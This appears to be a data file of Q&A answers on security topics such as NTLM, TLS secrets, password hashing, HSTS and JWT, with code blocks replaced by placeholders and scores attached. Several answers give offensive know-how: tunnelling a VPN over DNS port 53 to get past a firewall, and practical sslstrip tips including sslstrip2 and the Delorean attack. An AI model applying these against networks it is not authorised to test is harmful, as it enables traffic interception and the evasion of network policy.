","Forms-based authentication over proper, validated TLS is the modern way forward for web application authentication that require non-SSO (Single Sign On) capabilities (e.g., SAML, OpenID, OAuth2, FIDO, et al). NTLM authentication is only utilized in legacy networks. Microsoft no longer turns it on by default since IIS 7. Microsoft Domains and/or Forests with a Windows Server 2012 R2  do not even support NTLM authentication by default. Thus, its use is contraindicated. Cleartext authentication, such as via non-SSL/TLS HTTP, will result in compromise of the web app's credentials -- regardless of how strong the NTLM authentication (or other authentication) is, primarily because of Man-in-the Middle (MITM) scenarios, but also for many other credential-collecting reasons (see the  or the  tools). If you want to see what NTLM looks like on the wire (MITM scenario optional), check out this  which states the following: The essential difference between NTLM and NTLMv2 is how the response is calculated. NTLM uses MD4 and DES in a weak way which is well known (5 NULL bytes yada yada yada); NTLMv2 uses HMAC-MD5 based on more than just the password and challenge, which is where the “blob” comes in. So that’s covered off the “challenge”, “HMAC-MD5″ and “blob” that’s missing from the John hash I’m having to build up from scratch. The author then goes on to show an HTTP message with the Wireshark tool. In some scenarios, I believe it is possible to reverse which exact NTLM protocol is in use by just connecting to a HTTP-NTLM authenticating web server. As seen in the book, Network Security Assessment, 3rd Edition: {code-blk} To understand those variables and further HTTP-based NTLM authentication, check out the resources here --  -- as well as in the old presentation on Cracking NTLMv2 Authentication --  (for the different NTLM SSP provider internals)",307,491,4,True

","You can use the same technique as HTTP Digest Authentication (actually you could use exactly that technique, re-using any of several existing libraries). The server send a challenge, the client answers by (e.g.) hashing together the challenge and the secret. The server takes care never to reuse a challenge. Depending on the mechanics of the connection, you might need to re-authenticate the connection at every request. To reduce overhead you might want to use some kind of incremental nonce, i.e. {code-blk} Using HTTP with Digest-Auth this is done automatically. Using plain HTTP you might simply add a header or a parameter to each request. The Server stores the password salted with salt1, hashed. The server sends salt1 and a random (each connection a new) salt2 to the client. The client salts and hashes the password with salt1, salts and hashes the hash from step 1 again with salt2, sends this hash to the server. So to check the password the server has to salt and hash it's stored hash with salt2 and check for equality. This is OK, but it is equivalent to storing the password in the clear. For all intents and purposes, knowing the salt1-ed password is enough to perform a successful login; this means that if one were to gain access to the password database, he could use it as is without needing any decryption. You do have an advantage over storing the passwords in the clear, and this is that this way you needn't worry against password reuse (i.e. the user uses a password which is the same as his password for another service. Anyone gaining access to your database also gains access to this other service).",76,398,3,True

The AP decrypts the packets, transforms them into regular old Ethernet packets and forwards them to the switch.

","TL;DR That proxy does not allow for tunneling.  And you have a firewall that parses the HTTP requests, likely to disallow HTTP tunneling altogether.  You're pretty much limited to GET and POST. Since you can resolve DNS, and IPsec VPN on port 53 may be a good alternative. is not a standard general proxy.  In other words it does not follow (general) proxy standards (HTTP CONNECT or SOCKS), it simply is an HTTP proxy for GET and POST requests.  It is not a full HTTP proxy implementing HTTP CONNECT which would allow for tunneling connections and bypassing a firewall. In  php proxy uses CURL, more exactly {code-blk} Since it would fail on the same regex match.  And since your firewall only allows HTTP through (and parses it) you cannot use other protocols, e.g. VPN on posrt 80. Extra (more optimistic) note One thing that strikes me is that you can resolve DNS.  Therefore the firewall must allow UDP packets on port 53. And, unless you are using an internal DNS server (and so the DNS resolution is not passing through the firewall), you can get around the HTTP header limitation by running a VPN in udp mode (IPsec) and ""connect"" to port 53.  That will tunnel your traffic, and will look to the firewall as DNS requests and responses.",135,307,1,True

Credit for pointing to the actual answer in comments goes to @P4cK3tHuNt3R and @dave_thompson_085) Using Wireshark, I am trying to determine the version of SSL/TLS that is being used with the encryption of data between a client workstation and another workstation on the same LAN running SQL Server. You are viewing a connection which uses  (""Tabular Data Stream Protocol""): {code-blk} is the TLS version (TLS 1.2, as per ): The version of the protocol being employed.  This document describes TLS Version 1.2, which uses the version { 3, 3 }.  The version value 3.3 is historical, deriving from the use of {3, 1} for TLS 1.0. So the simple answer to your question, ""determine the version of SSL/TLS"", is ""TLS 1.2"". Now, I've seen varying reports as to whether Wireshark can properly parse TDS packets with encoded TLS.  I think that the answer is what you started with - it will tell you TLS is there, but won't parse the details as it would with a native TLS session. As per , it appears that Microsoft Network Monitor is capable of parsing both levels of encapsulation.  And a comment therein states that  is the newer equivalent of that tool.",83,350,2,True

","To give a concrete implementation of what @dave_thompson_085 said, this does the trick - it extracts the public key from each of the certificate and the private key, then calculates their md5 hash, allowing you to compare them easily: {code-blk}), but it doesn't provide visible confirmation.",130,81,1,True

the pre_master_secret into the master_secret.  The pre_master_secret

","The master secret is always used for deriving further key material for a TLS session (and can effectively be seen as session key) in TLS 1.2 and earlier versions. The premaster secret is a result from a key exchange, from this key the master secret is derived. Two key exchange methods are defined: RSA key exchange (). Here, a random value is generated by the client (premaster secret, ) and encrypted using the public key from the server's certificate. The result is sent over the wire in a Client Key Exchange message. Diffie-Hellman (DH) key exchange (). Here, both the server and client send their public values (not from the Certificate!) using the Client and Server Key Exchange messages (Section ). Using their respective private components, they can compute a shared secret which is transformed into a premaster secret. The master secret is  calculated from the premaster secret (together with two random values from the Client and Server Hello messages): {code-blk} As you can see, the premaster secret is essentialy for the initial computation, but can be thrown away after the master secret is calculated. When session resumption is in use, typically the master secret (and not the premaster secret) is stored directly in the TLS session cache. As a closing note, notice that the premaster secret for RSA key exchanges can be found by decrypting the (1) encrypted premaster secret (which was sent over the network) using the (2) private RSA key (which is bound to the certificate and reused for all RSA key exchanges). With the DH key exchange, the premaster secret is calculated from (1) a public value (which was sent over the network) and (2) a private value (which is normally different every time). The private value is then discarded (instead of reused, as in the RSA case). This provides the  property (when done properly without ).",84,423,3,True

","(Summary is in the last paragraph.) How long will it take to crack 1 password? Is the time to crack 1 billion, just {code-blk}, which is called a collision (two inputs mapping to the same output). In md5 this does not happen so easily. The order matters and you cannot derive any information about the input given the output. Not even the length. So you have to resort to just trying all possibilities until you find one that gives you the right output. If someone has a strong, random, 20-character password, it could take centuries. But most people use passwords like ""horselover49"", ""letmein"" or ""penis"" (though the latter might be too short), which are much easier to crack. The reason everyone's complaining about using md5 is because it's fast. But hashing algorithms are made to be fast. MD5 might be broken for other purposes, but it isn't for password hashing. You just shouldn't use a single pass of any hashing algorithm, be it md5 or sha1 or sha512. Better algorithms, like bcrypt/scrypt/pbkdf2/etc. use a hashing algorithm a million times (among other things). Now instead of being able to run the algorithm once for every guess, you need to run it a million times for each guess. That takes a lot longer, allowing you to try fewer passwords, which better protects weak passwords. So yeah, the same is going to happen as with other breaches that used MD5: lots of passwords will be cracked. But they won't all be cracked and definitely not in linear time. The stronger ones will take exponentially more time.",36,396,1,True

","Yes, AES-NI accelerates both AES-128 and AES-256, and yes, there is a performance difference between hardware accelerated AES-128 and AES-256, according to : On Ivy Bridge here are the raw numbers for both Cyber-Block-Chaining  (CBC) and XEX-based tweaked-codebook mode with ciphertext stealing (XTS) modes with both 128- and 256-bit keys. Note that for XTS mode, only half the key is used, so XTS-512 essentially utilizes a 256-bit key. {code-blk} We made the following observations: For CBC encryption, we see a 40% improvement for 128-bit keys over 256-bit keys. For XTS encryption, we see a 30% improvement for 256-bit keys over 512-bit keys. For CBC decryption, we see a 20% improvement for 128-bit keys over 256-bit keys. For XTS decryption, we see a 30% improvement for 256-bit XTS keys over 512-bit keys. Note that this is raw performance of the AES-NI instruction. In real world, there is disk I/O or network I/O that happens while data is being encrypted/decrypted, which would affect real world performance. Also, I believe the above numbers are for single core performance, in implementations that uses multiple cores, even AES-256 can easily saturate the entire I/O bandwidth of an SSD and most networks.

","Long answer, see TL;DR below! I don't think it's an Nmap problem, but rather a port-forwarding problem. I imagine you are scanning from the local network (if that's not the case, please ignore this). Port forwarding often don't work from the local network, for a very simple reason. Suppose this is your network: {code-blk} instructs Nmap to use a SYN packet to port 4245 during the ping scan).

I will actually give you a simplified version of it, because there is other stuff we do in our key derivation that isn't relevant to this question. The two keys that our clients are deriving from one master password are something we call a Master Unlock Key (MUK) which is the key with which the secret part of a user's public key pair is encrypted. The other key is the SRP-x to be used in the Secure Remote Password authentication protocol. Both are 256 bits. We start with two different salts, I will call one {code-blk} Now not all of those steps are necessary. But there are two differences in input to this when deriving either the SRP-x (for authentication) or the master unlock key (for encryption). The salt, and the version.

Also we use HKDF instead of HMAC-SHA256 so that we have something more adaptable to different key sizes. Use PBKDF2 with care Whatever you do, do not use one run of PBKDF2 to derive two keys.

","Client side validation The validation code you have provided is in JavaScript. That suggests it is code that you use to do the validation on the client. Rule number one of securing webapps is to never trust the client. The client is under the full control of the user - or in this case, the attacker. You can not be sure that any code you send to the client is used for anything, and no blocks you put in place on the client has any security value what so ever. Validation on the client is just for providing a smooth user experience, not to actually enforce any security relevant constraints. An attacker could just change that piece of JavaScript in their browser, or turn scripts off completely, or just not send the file from a browser but instead craft their own POST request with a tool like curl. You need to revalidate everything on the server. That means that your PHP must check that the files are of the right type, something your current code doesn't. How to do that is a broad issue that I think is outside the scope of your question, but  are good places to start reading. You might want to  at your {code-blk} This is not a good strategy. The fact that you mention this in the context of validating file extensions makes me worried that you are just throwing a couple of security related functions at your input hoping it will solve the problem. For instance, you should be using prepared statements and not escaping to protect against SQLi. Escaping of HTML tags and special characters to prevent XSS needs to be done after the data is retrieved from the database, and how to do it depends on where you insert that data. And so on, and so on. Conclusion I am not saying this to be mean, but you seem to be doing a lot of mistakes here. I would not be surprised if there are other vulnerabilities.

Because if you have a string of failed login attempts, you really really really should know if the last one was followed by a successful login. Logs are relatively small.  If there was enough login attempts that logging would cause a problem, then ""not knowing about the attempts"" is probably a worse-case problem than ""found out about them when we ran out of disk."" A quick caveat - as @Polynomial points out, the password should not be logged (I seem to recall that 25 years ago some systems still did that).

","In general session information is not usually encrypted on the server side. It is generally assumed, as part of the threat model, that if an attacker gains access to the server then they already have everything they need. Session data itself is usually not any more sensitive than the rest of the contents of the database. There are a few options: Store them on the filesystem in plaintext. If your threat model suggests SQLi is more likely than filesystem access, this is an easy move. Encrypt session IDs and data using the database's inbuilt encryption routines. This protects you against cases where a database backup is compromised, but won't protect you against disk theft or an attacker with SQL access. Encrypt your session IDs and session data in the database, using a key set in a config file on the server somewhere. The benefit of this is that the attacker would need access to both the database (e.g. via SQL injection) and the filesystem at the same time in order to decrypt the session IDs and session data. Encrypt session IDs and data using a randomly chosen key which is cached within the server daemon process (e.g. APC or memcached for PHP). This would be exceedingly difficult for an attacker to gain access to without full code execution on the system, but has the downside that all session data would be invalidated if you restart the server process.

Making it impossible to access a service running on a port higher then 65535. There are no TCP/UDP services on ports higher than 65535. If it supports port numbers above 216-1, then it no longer is TCP (or UDP). Can you have something else that...? Sure. And could it be very similar to TCP? To the point of being backwards compatible? Yes to both questions. There has been so much talk about hardware and devices having backdoors created that only government have access too for monitoring, and I was just curious if this was possibly one of the ways they were doing it and avoiding detection and being found? If I had developed such a device, it would rely on a protocol common enough as to be unremarkable. An unknown/illegal protocol packet, after which some extra traffic ensues, would be quite suspicious. Hide in (almost) plain sight What such a device could do might be, for example, inspect some bytes in the payload. They would usually be noncorrelated values; I could then send packets to the target, or if it is a router, without even a IP address of its own, to some random, possibly even nonexistent host beyond the target, masquerading as (say) a HTTPS request, or a SSH login attempt. If you see a packet you do not know, you might get suspicious.

I did sslstrip a lot of times testing access to pages with HSTS and it works... they key as I said is the victim must do the http (without ""s"") initial request. Another decisive factor is that not everypage can be sslstripped if you use common browsers on last versions since some years ago... I mean, if you use modern Chrome, Firefox or Internet Explorer for example... these browsers have an internal list of known ssl sites. That sites (like twitter or facebook for example) will never be sslstripped because the browser knows that ALWAYS must look for them using https even if the user did the ""bad way request"" putting facebook.com without specifying the https:// before. I guess these sites pay to the browser's companies to be in that list. There are more advanced techniques to do sslstrip even to pages in that lists... like Delorean attack, or using sslstrip+ also called sslstrip2 which requires dns and proxy etc... but are more complicated. I suggest to you try against not very known ssl pages because in that way there are less possibilities to crash in your tests against a site which is in that browser internal lists.

SSH   ---------       -----------------------------
","SSH is not typically considered insecure in and of itself but it is an administrative protocol and some organizations require two or more layers of control to get access to an administrative console. For example connecting via a VPN first then opening an SSH session which connects through that VPN. This simply provides multiple layers of defense in depth and prevents your systems from being directly affected by the latest SSH vulnerabilities. Note: This is NOT a weakness in SSH itself and many organizations will still expose SSH on high TCP ports for use as SFTP servers then have a script move data to and from that system (not allowing the external SSH/SFTP server to connect to the rest of their network). All protocols eventually have vulnerabilities so if you can require the use of two different ones (i.e. IPSEC VPN and SSH) and stay disciplined about remediation efforts when vulnerabilities are discovered then the window of time where known vulnerabilities exist in both protocols at the same time on your network should be very small. Statistically, the requirement for using two protocols should reduce the amount of time where you would have a single protocol exposed with a known vulnerability (assuming you actually patch/remediate vulnerabilities). As a poor text graphic look the following: {code-blk} In the first example when an SSH vulnerability came out there wasn't one for IPSEC and vice versa so there was never a time, in this crude example, where your systems had vulnerabilities at both layers. This defense in depth is what is protecting the system behind these protocols which occasionally may have vulnerabilities. In the second example, SSH by itself, the moment there is a vulnerability, or a password breach, or any number of other issues, an attacker can directly access your vulnerable system during the window of exposure. I would ask if any other administrative protocols are being exposed and if so then you can question the technology bias but most likely you may be in an organization that doesn't allow any administrative protocols to be accessed directly from the Internet.",38,431,1,True

","The term Zero Day or Zero Hour can apply to any type of attack. It's really just a classification given to the time period at which a vulnerability has just been discovered by a person or organization but has not yet been disclosed publically. Some definitions also include the first day or ""Day Zero"" of a vulnerabilities announcement and the race between attackers and defenders to attack or defend their systems when this type of announcement is made. Zero Day attacks are particularly dangerous because for the short time period they haven't been disclosed the attackers can effectively compromise some level of system access across almost all systems which are vulnerable. In some cases, this can give an attacker access to millions of devices or access to lots of sensitive data. Once it has been disclosed publically or there is a known remediation it is no longer considered to be a Zero Day. Note: Some definitions vary here. So there is no ""solution"" to preventing Zero-day attacks as new vulnerabilities and exploits will always be discovered before the remediations to prevent such problems from being exploited can be created. Effectively the holes will always exist before their respective patches. This said there are additional defenses which can be implemented to reduce the risk from certain types of Zero-Day attacks or limit their damage but it is not possible to anticipate all attack vectors. This is really why you want to have multiple security tools because at any given time one layer of defense (one of your security tools can fail or be vulnerable). In other words, if you think of security as a function of time at some point a vulnerability will exist even on the most well-secured networks. If you only have one level of defense protecting your data your security will look like the following: {code-blk} Even though each layer of security gets vulnerabilities from time to time they don't all align for an attacker to get through all three layers. In rare cases, this can happen but statistically multiple layers can provide much better security than one layer by itself. One of the best defenses against Zero-Days is a very disciplined staff keeping multiple layers of security up-to-date. Discipline is key here, the layers just buy you more time.",90,469,3,True

When your site is accessed over HTTPS with no certificate errors, the browser knows your site is HTTPS capable and will honor the Strict-Transport-Security header. The purpose of HSTS is to tell the client NOT to switch to HTTP once it has accessed a website over HTTPS, and not the other way round. From : HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. : A downgrade attack is a form of attack on a computer system or communications protocol that makes it abandon a high-quality mode of operation (e.g. an encrypted connection) in favor of an old, lower-quality mode of operation (e.g. clear text) that is there for backward compatibility with older systems. So a HSTS header isn't used to redirect a new HTTP connection to HTTPS, but rather to prevent a browser from making HTTP requests to an existing HTTPS site. The  plugin on the other hand ensures the web browser makes HTTPS connections to websites that support HTTPS, but are also accessible over HTTP. Many sites on the web offer some limited support for encryption over HTTPS, but make it difficult to use. For instance, they may default to unencrypted HTTP, or fill encrypted pages with links that go back to the unencrypted site. The HTTPS Everywhere extension fixes these problems by using clever technology to rewrite requests to these sites to HTTPS.",148,467,2,True

Final note: Some vendors use FTP because they don't know how to use SFTP from the system they are using (most notably this occurs with AS/400's). It is possible to have the AS/400 FTP the files to a loopback address on itself (127.0.0.1) then have you access them via SFTP. This is MUCH safer than using FTP directly. Likewise, you can have the vendor do the reverse of what I wrote above to send these files to an SFTP server on their end instead of forcing you to use FTP at all. Alternatively, you can run the FTP through a VPN which only allows your organization to initiate connections to the remote vendor but not allowing them to access your network.",86,361,1,True

","You've got a few different requirements mixed together in there, and I'm not entirely convinced that you need to complicate it that much. First, you want the URL to always be HTTPS - this is the purpose of the HTTP Strict Transport Security (HSTS) header. If sent as a header to a page served over HTTPS, all subsequent requests to the site from compliant clients will be over HTTPS. If you never get HTTP traffic to your site, you can also simply disable listening on port 80 (or whatever you have your HTTP server listening on). If you do get legitimate HTTP traffic, but want to transition it all to HTTPS, you can use rewrite rules or simple redirections to shift the traffic over, and then it'll be affected by the HSTS header for future requests. You'll also want to make sure you've adjusted any links and form submissions within your site to be relative, or to use protocol relative addresses.

Building short key ID collision just brought ""fake key attacks"" to a new level, but these have always been possible. What can be done to combat this problem, or reverse the damage? As all keys from the Evil 32 set have been revoked, at least that key should not be considered at all by others. But of course, such a key set could be created at any time again!

Message Signature or MAC Computation) {code-blk} So changing the payload should invalidate the signature. (2) Do NOT encrypt your own JWT!! There is an actual specification that defines how to encrypt JWTs (called JWE): JWE uses authenticated encryption which means that the plaintext is first encrypted and then an integrity check is produced over the ciphertext. You can get more info on what the plaintext looks like from Section 5.1 of above Spec. It is possible to securely store access policies in the payload of your JWT if you use either encrypted or signed formats. You may want to use encrypted if you don't want the client or other parties to have any knowledge of the policy data. If you don't care who can read it and you only care about who can change the values, use signatures only. Remember though that the more security you add, the bigger the performance impact so use your judgement on what is needed. Final note: Key management of the signature and encryptions keys also becomes an important issue for you to consider, because at the end of the day, whoever has access to the keys can decrypt your JWE or modify the signature of your JWS.

Bob compares the two results; if they match, Bob has the proof that the signature is associated with the data and Alice's private key generated the signature.

","Update 21 Oct 2017. I found some useful info in  under Section 4 ""Security Considerations"". Based on this recommendation, we can consider DH Groups 14 and 24 as too weak to protect AES 128 Symmetric Keys - this leaves DH Groups 19 through 21 ECP as the minimum acceptable Diffie Hellman groups for generating AES symmetric keys (128 bit and higher). When secret keys of an appropriate size are used, an approximation of the strength of each of the Diffie-Hellman groups is provided in the table below.  For each group, the table contains an RSA key size and symmetric key size that provide roughly equivalent levels of security.  This data is based on the recommendations in [NIST80057]. {code-blk} I was able to find some pairing suggestions in the  under the ""Cipher Selection"" heading.

But the question is relevant to not knowing the password, and the original data isn't generally accessible, which has information security implications that may make it worth answering here anyway.) It sounds like the Absolute Secure solution may be setting a controller-level ATA password. With high-security configurations, drives locked in this way cannot be unlocked without the original password, and can only be re-wiped. If you attach the drive directly to a system with a SATA or other direct cable (and not via USB), and then boot from your Linux live CD, you may be able to at least restore the drive to service, as follows. First, check to see if the drive is in a frozen state: {code-blk}",70,197,1,True

","What you want to achieve is to enforce some security to /private/ and otherwise serve content freely. Login page shall be outside private. Servers who handle path based security know how to handle the escapes. What they look for is to bring both the path and the pattern to a ""canonical"" form. This way, they make sure that they compare slash with slash and not with it's URL escape. Usually declarative security beats programmed security. This implies that testing path is done in a single place, outside the application, in a 3rd party library written with security in mind. Odds are that the ones who wrote the library were aware about the fact that an URL may contain escapes. Another advantage of declarative security is that it doesn't clutter the code so much. We will not have things like: {code-blk} A distracted programmer may forget the check for one single action. Rather, have an annotation system of ""actions"" that will be checked by a caller. If the security handler is missing, fail the call at runtime, this means the programmer has forgotten to ""secure"" the routine. ""The free for all"" functions shall have a @freeForAll annotation. In your case, the server must enforce that /private/ is only served if the visitors have a specific token, which they cannot manufacture themselves. For example, it would be wrong to check for a cookie with the content ""authenticated:true"", as the clients may generate such cookie without visiting the login.",64,340,1,True

","TL;DR: TLS can in theory be used without private keys. An integral part of TLS is that the client properly authenticates the server in order to detect potential man in the middle attacks. This is commonly done with certificates - and this requires the private key of the certificate on the server site to prove to the client that the server is the owner of the certificate1. But, TLS is flexible and also provides other ways to authenticate the server. There are  which allow authentication by using a pre-shared key between client and server. There are  which allow authentication by password. There are even  which allow you to abandon any kind of in-TLS authentication, i.e. require you to do your own authentication. Thus, TLS might be used without certificates. And since certificates are the only part of TLS which requires a private key this means that TLS can be used without private keys. But, even if no private key is used a similar secret thing might be required on the server: both SRP and PSK based authentication require a secret on the server side which should at most be known to server and client. Apart from this, certificate-less (and thus private-key-less) authentication requires both sides of the connection to support the relevant ciphers with the alternative authentication methods. Since browsers currently only support certificate-based authentication a private key is needed on the server side whenever access by a browser is required - i.e. practically every time in case of web servers. For example you can use openssl to provide a TLS protected connection which does not require certificates. The server would look for example like this: {code-blk}. 1 Private keys can not only be required for authentication but also for key exchange, i.e. RSA key exchange. But, RSA key exchange requires certificates so it again means that private keys are only relevant if certificates are used. Also, the Diffie-Hellman key exchange does not need certificates and this is actually the recommended method today since it provides forward secrecy.",60,444,1,True

","You can generate a virtual smart card on a Trusted Platform Module (TPM). A TPM is like a Hardware Security Module (HSM), except that a TPM is physically attached to a computer's motherboard and thus isn't portable. Lots of motherboards have TPMs on them, it's just that a lot of people don't know it and therefore don't often use their TPM.  The main advantage of a TPM is probably its lower cost, relative to HSMs.  A TPM is even more affordable than smart cards, which have to be provisioned to every user and replaced whenever lost.  Another advantage of a TPM, relative to smart cards, is that its non-portability makes it unlikely to be misplaced. About VSC's:  A Virtual Smart Card (VSC) lives on the TPM and stores the private key of a certificate.  The VSC is capable of being protected by a PIN, and the PIN can be set to a minimum level of complexity depending on how you created the VSC. Here are some instructions to get you started (note: Windows is required): Check to see if your TPM is active: Click on the Windows icon, then type the following command, right-click on the icon and execute it as an administrator: {code-blk}, click on the Save button. In PuTTYWinCrypt, try connecting now via SSH.  If you configured everything properly, you should get a pop-up from the Virtual Smart Card on your TPM, asking for your PIN.  Input the PIN.  If the PIN is accurate, the SSH connection should continue and connect as expected. You're done!  You just connected to your server over SSH with a private key that is safely stored on your TPM. The above information was inspired by, and partially obtained from, an informative  by Chris van Marle.

Failure to meet this uniqueness requirement can significantly degrade security. The nonce_explicit MAY be the 64-bit sequence number.

","The four hash values you see are SPKI hashes. While the fingerprint you see when looking at the certificate is computed over the whole certificate the SPKI hash is only computed over the SubjectPublicKeyInfo, i.e. the public key contained in the certificate. See  for more details including ways to compute the SPKI hash using common tools. Apart from that these SPKI hashes do not necessarily specify the leaf certificate (i.e. the one you were looking at). Instead at least one of the SPKI hashes for a site should match one of the certificates in the certificate chain, i.e. from leaf up to and including the locally trusted root certificate. This matches the behavior of the HPKP header which is described in  as follows: ... compute the SPKI Fingerprints for each certificate in the Pinned Host's validated certificate chain ... check that the set of these SPKI Fingerprints intersects the set of SPKI Fingerprints in that Pinned Host's Pinning Metadata To manually do the checks one might export every certificate from the browser, compute the SPKI hash (see first link on how to do this) and then check if it is in the list of preloaded SPKI hashes.

This is due to a fundamental issue if hashing. Which is the possibility of hash collisions. Let's say I'm an attacker (Eve). Alice wants to talk to Bob, so Signal sends her public key to Bob, but Eve intercepts the public key and substitutes her own. Normally there is an indication the key changed, and the Safety Number changes. IF Eve had enough resources she could construct a public key which matched the safety number. To combat this threat we make it so that Eve would need to find a collision which occurs after 5200 rounds of hashing, with adding that same key every round. This becomes computationally infeasible since each round of hashing makes finding a collision linearly more computationally expensive. The number of iterations currently picked usually is calculated on how long an attack of this style would take based in resources of the percieved threat.

","(Something old...) There's this fresh innovation Pretty Good Privacy (PGP). It has been around for almost thirty years and it can sign plain text for both authenticity and integrity. The PGP is known of and widely used for signing email messages, but it has a support for clearsigned text documents. In practice you could sign a message using That's why its better to keep a digital copy even if it's just a plain text message. It's easy to compare the two printouts and verify the digital version of the original. There's no need to verify the modified paper copy. The PGP signature verifies that you have signed the message as long as you can proof that the key used for signing was yours. On the other hand, the time on the signature can't be trusted as you can fabricate it. You would have to provably publish the signature somewhere. You can publish the signature without the original message as it only contains (SHA256) checksum that is affiliated with your public key. It's a proof that your private key has signed the message in that precise form. (...something new...) Take a hash of the file, just like in the PGP solution, or even the whole signature, depending on whether you wan't it to be linked to you or not. Put it on a blockchain (e.g. Bitcoin; you can see a lot of them in ). Now you have proof of that document existing in that exact form on that specific time, and it'll stay there forever. As hash algorithms utilizes one-way functions, the hash doesn't reveal the contents of the file. However, anyone having the file can also take the hash and compare it to the one published. Depending on the situation you might want to be associated with the file or not: You may want to be acknowledged as the creator and prevent someone else from patenting your invention (...something borrowed..).

Furthermore, techniques such as exponential back-off (like in the case of the Ethernet protocol) should be used before retrying CAS. From a software perspective, if not sure of the hardware behind, one can make sure to use things such AtomicX.compareAndSet (JAVA SE 7,8) instead of AtomicX.weakCompareAndSet, which practically makes sure simultaneous fails of all threads is excluded.

","But how can I assume that an intruder can exploit the password weakness (if that even is a threat to me) if I don't even know yet whether weak passwords are allowed (that would be the vulnerability, right? but what if the system is enforcing a very strict and secure password policy or is even disallowing password authentication (only priv/pub key authentication is allowed). Yes, weak passwords are a vulnerability. Before you can do a risk assessment you need to find out about your vulnerabilities. One way to go about understanding your vulnerabilities as well as threats would be to have the system undergo penetration testing. This will involve use of penetration tools and scripts that will attempt to exploit vulnerable libraries or insecure programming. But to make the most of a penetration tester, you will want to give them as much information as possible including the application source code. If the tester only needs to make use of basic penetration tools to break into your system, you now know a script-kiddie could compromise your system - that's a pretty high threat. On the other hand if the tester has to devise custom script/program then, while still a threat, it is less likely to happen. Once you have a much better idea of your vulnerabilities and type of threats who can exploit those vulnerabilities you can do a risk assessment of each weakness. Risk assessments can help prioritize what to fix first. Skip to the end of the ENISA Risk Assessment document where it states that risk evaluation involves: consequences (e.g. impacts), the likelihood of events, the cumulative impact of a series of events that could occur simultaneously In other words, {code-blk} There are of course many ways to customize this.

","Yes it is possible, but only in certain cases.  There are two general classes of Header Injection attacks that I am aware of: One is a Man-in-the-Middle (MITM) attack where someone is intercepting your traffic to inject header info.  HTTPS connections protect against these. The second is a Cross-Site Script (XSS) attack.  These are attacks against an application level vulnerability where a user of a website can use his input to affect the way that headers are dynamically created for other users. With XSS attacks, you change the way the server parses what it's sending you before it is encrypted for transmission; thus the content can be modified.

","DHT nodes randomly generates node ID by themselves. {code-blk}. It is unlikely that one node has the same Node ID as the other node. Even if a malicious node impersonates another node, nothing will happen. That node continues to function as usual without facing denial of service. Other nodes will continue to query that node for lookup search as that node has stayed longer in DHT than a malicious node and is known to other nodes. Whereas the malicious node has to propagate his presence in DHT which can take some time. The situation will look something like same node ID but with two different routing tables. Some new nodes will query that malicious node as they discover him and he may return false responses but as the data in DHT is replicated very quickly, even if a single node is acting malicious that doesn't affect other nodes in DHT. Instead a threat actor signs up thousands of random nodes in DHT to propagate false information. This is called Sybil attack. Cloning node ID is not really a problem because nodes die very quickly. By the time a malicious node will propagate his presence, the victim is probably gone offline and come back with new node ID. Though BitTorrent spec recommends to keep the same node ID as earlier because your earlier node ID might be still in other's routing table.",90,318,1,True

","No, this is not enough. An attacker does not necessarily need to call an external script. They can dump the payload directly into the inline script too. Depending on the length restrictions in place, this can become quite tricky, but still manageable. The main takeaway from this is that custom-made solutions are not very secure. Every now and then I see people trying to ask if their new ingenious solution just stopped all XSS, CSRF, SQL Injections, etc... The answer to all of these questions is no. XSS Protection is a problem that has been solved already, with proper output encoding and additionally possible input validation. This means that every output needs to be encoded for its intended destination. Don't do this yourself either, but use a framework or library which provides this for you. Input validation verifies if input is in the expected format. For example, if you expect an email address, RFC-822 offers a very large regex, which is guaranteed to validate all standard-conform email addresses. Is this overkill and unnecessary? Probably. But for simpler things like numbers, you can implement input validation in addition to output encoding: {code-blk} This example code would allow all integers without zero-prefixes. Any other input will be rejected. Summary Never use your own custom method to implement security! This is the golden rule of security and breaking it will get you hacked. Use output encoding for the target context! If untrusted data is written into the DOM, then encode it for the DOM. If it's written for an attribute value, then encode it as attribute value. Encoding is the only way to be sure. Optionally use input validation alongside output encoding! By ensuring that input is what you expect it to be, you can save yourself multiple headaches down the line.",62,410,1,True

","What you are looking for a is reverse Whois service. But most ""reverse whois"" tools you'll find online will allow you to lookup domains based on the administrator's email address, which may or may not be in the domain's whois record. Also, simply looking for the AS numbers will give limited results, as many companies don't have their own AS, and rely on their ISP/hosting provider. The site  (which I own and maintain) takes a different approach. Instead of looking at the whois databases for email addresses, it looks at the ""netblocks"", that is, the ranges of IP addresses owned by organisations. This approach allows you to lookup the company name instead of the email address. Once you have the IP address ranges for a given company, you can use the tool to discover domain names hosted on their IP addresses. To take your example, PayPal, you can lookup their IP addresses . Then, if you use the ""Domains in this network"" link for each result, you'll eventually find all the domains hosted in their networks.

","The same as using plaintext (unencrypted and unauthenticated) communication elsewhere. What exactly that means, depends on your threat model. Smart Bulb, Dumb Protocol Imagine you had a smart lightbulb in your home. You could use an app to control the brightness and the warmth of the bulb. It even offers an API, so you can control it via a Raspberry Pi too, if you wanted. Sadly, the bulb doesn't offer HTTPS, so all your communication is in clear text. It may sound terrible, but it's probably fine. Why? Because in order for an attacker to do something about it, they'd need to be in the same network as you. And if the attacker is already in your home network, then you probably have more problems than a dumb smart bulb. But what could an attacker do? For once, an attacker can read what you send to the bulb, and what the bulb sends in return. This is most likely something like: {code-blk} All in all, very boring data. Yes, technically, your confidentiality was violated, but in this scenario, that's not very problematic. The attacker knows your bulb is set to 73% brightness. Of course, an active attacker could do more. They could modify what you send to the device, and also what the device returns. Depending on what you do with the data, this might be dangerous. How can I protect myself? You can't. Well, technically you can, but it requires some fiddling. Okay, a lot of fiddling. If an IoT device does some task like sending e-mails, but doesn't encrypt them, you can at least use a proxy to remove any sensitive information before an e-mail is sent. It's a lot of work, and will give you very little benefit. It's easier to just forbid communication with the outside world, if this is possible. How can developers fix this mess? Developers can use ciphers specifically designed to require low power consumption and low memory requirements. Yes, it'll make the product more complex to design, and it will make the end result more expensive, but it's more secure than the alternative.",92,482,2,True

